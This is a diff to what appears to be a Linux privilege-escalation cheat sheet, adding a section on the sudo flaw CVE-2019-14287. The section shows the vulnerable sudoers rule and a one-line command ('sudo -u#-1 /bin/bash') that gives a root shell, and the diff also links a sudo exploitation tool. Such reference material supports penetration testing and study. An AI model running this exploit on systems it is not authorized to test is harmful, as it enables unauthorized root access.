@@ -28,6 +28,7 @@
     * [LD_PRELOAD and NOPASSWD](#ld_preload-and-nopasswd)
     * [Doas](#doas)
     * [sudo_inject](#sudo-inject)
+    * [CVE-2019-14287](#cve-2019-14287)
 * [GTFOBins](#gtfobins)
 * [Wildcard](#wildcard)
 * [Writable files](#writable-files)
@@ -389,6 +390,7 @@ uid=0(root) gid=1000(swissky)
 | CAP_NET_BIND_SERVICE  | SERVICE Bind a socket to internet domain privileged ports  |
 
 ## SUDO
+
 Tool: [Sudo Exploitation](https://github.com/TH3xACE/SUDO_KILLER)
 
 ### NOPASSWD
@@ -458,6 +460,17 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 Slides of the presentation : [https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf](https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf)
+
+
+### CVE-2019-14287
+
+```powershell
+# Exploitable when a user have the following permissions (sudo -l)
+(ALL, !root) ALL
+
+# If you have a full TTY, you can exploit it like this
+sudo -u#-1 /bin/bash
+```
 
 ## GTFOBins
 
